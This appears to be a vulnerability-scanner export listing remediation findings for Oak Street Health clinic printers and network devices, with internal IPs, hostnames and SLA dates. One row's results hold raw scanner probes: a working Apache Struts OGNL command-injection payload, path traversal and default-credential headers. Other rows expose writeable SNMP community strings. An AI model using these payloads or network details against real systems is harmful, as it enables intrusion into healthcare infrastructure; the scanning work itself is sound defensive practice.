Status,Assignment,Assignment Reason,Date Assigned,Application,POC,IT Manager,Shared Server,Priority,PCI,Score Range,MAX Sev,Asset Risk,Due Date,QID,Remediation Notes,GRC,GRC Expiration,Server Name,IP,Port,Title,Exploit Sources,OS,Asset Family,Asset Tags,Data Source,Instance,First Detected,Last Detected,Last Assignment Update,Reopened,Sev Low,Sev Medium,Sev High,Sev Critical,"SLAMonth
Low","SLAMonth
Medium","SLAMonth
High",SLAMonth Critical,"Met SLA
Low","Met SLA
Medium","Met SLA
High","Met SLA
Critical",Vuln ID,TotalCVEs,Results,Application SVP,Overdue Total CVEs
Due in 30 Days,HCD_Health Care Delivery_OSH,"4_Title Search:% ApplicationMatch:_Rule:3794278_2025-09-05
Unknown",2025-09-05 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,Low Risk (1-39),34,EDR,2026-09-05 00:00:00,86728,,,,10.120.66.225,10.120.66.225,80,Web Server Uses Plain-Text Form Based Authentication,,,OTHER,OSH - Clinic Group 01,Qualys_CSAM,HCD,2025-09-05 00:00:00,2026-08-22 00:00:00,2025-09-05 00:00:00,,1,0,0,0,2026-09-01 00:00:00,,,,1,0,0,0,952602381_86728_80,1,"GET / HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive

form class=clearfix id=configure_form

section id=wired-uplink-config
h1Uplink configuration/h1
pConfigure the uplink Internet connection on this a class=&apos;device_noun&apos;/a./p
fieldset id=ip_config class=ip_config style=&apos;height:100%&apos;
h2Internet 1/h2
ul
li id=wan0_role_op class=wan0_enabled_op
label for=&apos;wired_wan0_enabled&apos;Role/label
select class=&apos;wired_wan0_enabled&apos; name=&apos;wired_wan0_enabled&apos;
option value=&apos;enabled&apos;Internet/option
option value=&apos;disabled&apos;LAN/option
/select
/li

li id=wan0_remap_op class=wan0_remap_mode_op
label for=&apos;wan0_remap_mode&apos;Active Port/label
select class=&apos;wan0_remap_mode&apos; name=&apos;wan0_remap_mode&apos;
!-- enum wan_remap_enum --
option value=&apos;2&apos;Auto/option
option value=&apos;1&apos;SFP/option
option value=&apos;0&apos;Ethernet/option
/select
/li

li id=vlan_config class=vlan_config
label for=&apos;vlan_tagging_enabled&apos;VLAN tagging/label
select class=&apos;vlan_tagging_enabled&apos; name=&apos;vlan_tagging_enabled&apos;
option value=&apos;disabled&apos;Don&apos;t use VLAN tagging/option
option value=&apos;enabled&apos;Use VLAN tagging/option
/select
/li

li class=&apos;vlan_id_config&apos;
label for=&apos;vlan_tag&apos;VLAN ID/label
input id=&apos;vlan_tag&apos; name=&apos;vlan_tag&apos; type=&apos;text&apos; size=GET / HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18 (.NET CLR 3.5.30729)

GET /#/ HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive

GET /#/phpinfo.php HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive

GET /index.html HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive

GET /#/ HTTP/1.1
Host: 10.120.66.225
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Connection: close

GET /#/login HTTP/1.1
Host: 10.120.66.225
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close

GET / HTTP/1.1
Host: 10.120.66.225
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Connection: close

GET / HTTP/1.1
Host: 10.120.66.225
User-Agent: ZX-80 SPECTRUM
Accept: */*
Accept-Language: en
Authorization: Basic YWRtaW46cm9vdA==
Accept-Encoding: gzip,deflate,compress,identity..
Keep-Alive: 300

GET // HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive

GET /. HTTP/1.1
Host: 10.120.66.225

GET / HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive
Authorization: Negotiate YGwGBisGAQUFAqBiMGCgDjAMBgorBgEEAYI3AgIKo04wTKA7OzkEASUkNAQBBSSBLiSBKySBJCSBISSBHiSBGySBGCSBFSSBEiSBDySBDCSBCSSBBiSBAwSBAAQCUUehDQQLUXVhbHlzR3VhcmQ=

GET http://Qualys.null/ HTTP/1.0

GET http://10.120.66.225:1/ HTTP/1.0

GET /../../../../../../../ HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive

GET / HTTP/1.0

GET / HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Content-Type: %{(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmdlinux=&apos;ifconfig&apos;).(#cmdwin=&apos;ipconfig&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmdwin}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmdlinux})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

GET / HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)

GET /?action=login HTTP/1.1
Host: 10.120.66.225
Connection: Keep-Alive

GET / HTTP/1.1
Host: 10.120.66.225",,0
Due in 30 Days,HCD_Health Care Delivery_OSH,"4_Title Search:% ApplicationMatch:_Rule:3794278_2025-09-05
Unknown",2025-09-05 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,Low Risk (1-39),32,EDR,2026-09-05 00:00:00,38863,,,,10.120.51.49,10.120.51.49,443,Weak SSL/TLS Key Exchange,,,OTHER,OSH - Clinic Group 01,Qualys_CSAM,HCD,2025-09-05 00:00:00,2026-08-22 00:00:00,2025-09-05 00:00:00,,1,0,0,0,2026-09-01 00:00:00,,,,1,0,0,0,952600273_38863_443,1,"PROTOCOL CIPHER NAME GROUP KEY-SIZE FORWARD-SECRET CLASSICAL-STRENGTH QUANTUM-STRENGTH
TLSv1.2 DHE-RSA-AES256-GCM-SHA384 DHE   1024 yes 80 low
TLSv1.2 DHE-RSA-AES128-GCM-SHA256 DHE   1024 yes 80 low",,0
Due in 30 Days,HCD_Health Care Delivery_OSH,"4_Title Search:% ApplicationMatch:_Rule:3794278_2025-09-05
Unknown",2025-09-05 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,Low Risk (1-39),20,EDR,2026-09-05 00:00:00,38794,,,,RALEIGHNE-LAB,10.120.3.3,443,Secure Sockets Layer/Transport Layer Security (SSL/TLS) Server Supports Transport Layer Security (TLSv1.1),,"Xerox VersaLink B400; System 37.81.91, Controller 1.96.3, IOT 2.10.0, Panel 91.16.11, Boot 11.1.234, Contents 5.0.0, Plugin 4.0.2, RSEP 1.8.25",OTHER,OSH - Clinic Group 01,Qualys_CSAM,HCD,2025-09-05 00:00:00,2026-08-22 00:00:00,2025-09-05 00:00:00,,1,0,0,0,2026-09-01 00:00:00,,,,1,0,0,0,952606474_38794_443,1,TLSv1.1 is supported,,0
Due in 30 Days,HCD_Health Care Delivery_OSH,"4_Title Search:% ApplicationMatch:_Rule:3794278_2025-09-05
Unknown",2025-09-05 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,Low Risk (1-39),34,EDR,2026-09-05 00:00:00,38628,,,,10.120.64.232,10.120.64.232,443,Secure Sockets Layer/Transport Layer Security (SSL/TLS) Server supports Transport Layer Security (TLSv1.0),,"Xerox VersaLink C625 Color; SS 120.024.014.16700, NC 120.024.16700.902950v1, UI 120.024.16700, ME 221.146, CC 120.024.16700, DF 221.146, FI 000.000.000, FA 003.020.015, OS 221.146, SC 221.146, SU 003.012",OTHER,OSH - Clinic Group 01,Qualys_CSAM,HCD,2025-09-05 00:00:00,2026-08-22 00:00:00,2025-09-05 00:00:00,,1,0,0,0,2026-09-01 00:00:00,,,,1,0,0,0,952607986_38628_443,1,TLSv1.0 is supported,,0
Due in 30 Days,HCD_Health Care Delivery,"4_Title Search:% ApplicationMatch:_Rule:3794278_2026-08-07
Unknown",2026-08-07 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,High Risk (60-79),63,EDR,2026-09-06 00:00:00,105459,,,,WESTOWN-OD,10.122.99.5,,EOL/Obsolete Software: SNMP Protocol Version 1/2c Detected,,"Xerox VersaLink B400; System 37.82.11, Controller 1.97.1, IOT 2.10.0, Panel 91.16.11, Boot 11.1.234, Contents 5.0.0, Plugin 4.0.3, RSEP 1.8.25",OTHER,,Qualys_CSAM,HCD,2025-10-10 00:00:00,2026-08-28 00:00:00,2026-08-07 00:00:00,,0,0,1,0,,,2026-09-01 00:00:00,,0,0,1,0,985170982_105459,1,"public allows SNMPv2 access which is an obsolete version.
public allows SNMPv1 access which is an obsolete version.",,0
Due in 30 Days,HCD_Health Care Delivery_OSH,"4_Title Search:% ApplicationMatch:_Rule:3794278_2025-09-06
Unknown",2025-09-06 00:00:00,Network,"Gassmann, Joseph",,,,,Low Risk (1-39),34,EDR,2026-09-06 00:00:00,48169,,,,10.120.56.41,10.120.56.41,,Remote Management Service Accepting Unencrypted Credentials Detected (FTP),,APC Network Management Card AOS,Network,OSH - Clinic Group 01,Qualys_CSAM,HCD,2025-09-05 00:00:00,2026-08-22 00:00:00,2025-09-06 00:00:00,,1,0,0,0,2026-09-01 00:00:00,,,,1,0,0,0,952617592_48169,1,Service name: FTP on TCP port 21.,,0
Due in 30 Days,HCD_Health Care Delivery,"4_Title Search:% ApplicationMatch:_Rule:3794278_2026-08-07
Unknown",2026-08-07 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,High Risk (60-79),60,EDR,2026-09-06 00:00:00,78030,,,,WESTOWN-OD,10.122.99.5,161,Readable SNMP Information,"metasploit, packetstorm","Xerox VersaLink B400; System 37.82.11, Controller 1.97.1, IOT 2.10.0, Panel 91.16.11, Boot 11.1.234, Contents 5.0.0, Plugin 4.0.3, RSEP 1.8.25",OTHER,,Qualys_CSAM,HCD,2025-10-10 00:00:00,2026-08-28 00:00:00,2026-08-07 00:00:00,,3,0,2,0,2027-08-01 00:00:00,,2026-09-01 00:00:00,,3,0,2,0,985170982_78030_161,5,public,,0
Due in 30 Days,HCD_Health Care Delivery_OSH,"4_Title Search:% ApplicationMatch:_Rule:3794278_2025-09-06
Unknown",2025-09-06 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,Low Risk (1-39),20,EDR,2026-09-06 00:00:00,38794,,,,10.120.51.15,10.120.51.15,443,Secure Sockets Layer/Transport Layer Security (SSL/TLS) Server Supports Transport Layer Security (TLSv1.1),,"Xerox AltaLink C8145; SS 122.010.035.21000, NC 122.010.21000, UI 122.010.21000, ME 032.045.000, CC 122.010.21000, DF 023.026.000, FI 000.000.000, FA 000.000.000, SC 016.024.015, SU 122.010.21000, OS 122.035.20400",OTHER,OSH - Clinic Group 01,Qualys_CSAM,HCD,2025-09-05 00:00:00,2026-08-22 00:00:00,2025-09-06 00:00:00,,1,0,0,0,2026-09-01 00:00:00,,,,1,0,0,0,952600276_38794_443,1,TLSv1.1 is supported,,0
Due in 30 Days,HCD_Health Care Delivery,"4_Title Search:% ApplicationMatch:_Rule:3794278_2026-06-08
Unknown",2026-06-08 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,Medium Risk (40-59),48,EDR,2026-09-06 00:00:00,38794,,,,LANCASTER-PRM,10.126.11.4,443,Secure Sockets Layer/Transport Layer Security (SSL/TLS) Server Supports Transport Layer Security (TLSv1.1),,"Xerox VersaLink B405; System 38.81.91, Controller 1.96.3, IOT 2.10.0, ADF 1.0.10, Fax 104.8.0, Panel 91.16.11, Boot 11.1.234, Contents 5.0.0, Plugin 4.0.2, RSEP 1.8.25",OTHER,,Qualys_CSAM,HCD,2025-11-03 00:00:00,2026-08-24 00:00:00,2026-06-08 00:00:00,,0,1,0,0,,2026-09-01 00:00:00,,,0,1,0,0,1006428447_38794_443,1,TLSv1.1 is supported,,0
Due in 30 Days,HCD_Health Care Delivery,"4_Title Search:% ApplicationMatch:_Rule:3794278_2026-06-08
Unknown",2026-06-08 00:00:00,OakStreet Health (OSH),"Gassmann, Joseph",,,,,Medium Risk (40-59),57,EDR,2026-09-06 00:00:00,78031,,,,LANCASTER-PRM,10.126.11.4,161,Writeable SNMP Information,"The Exploit-DB, nist-nvd2, exploitdb, nvd, seebug","Xerox VersaLink B405; System 38.81.91, Controller 1.96.3, IOT 2.10.0, ADF 1.0.10, Fax 104.8.0, Panel 91.16.11, Boot 11.1.234, Contents 5.0.0, Plugin 4.0.2, RSEP 1.8.25",OTHER,,Qualys_CSAM,HCD,2025-11-03 00:00:00,2026-08-24 00:00:00,2026-06-08 00:00:00,,5,1,0,0,2027-06-01 00:00:00,2026-09-01 00:00:00,,,5,1,0,0,1006428447_78031_161,6,private,,0
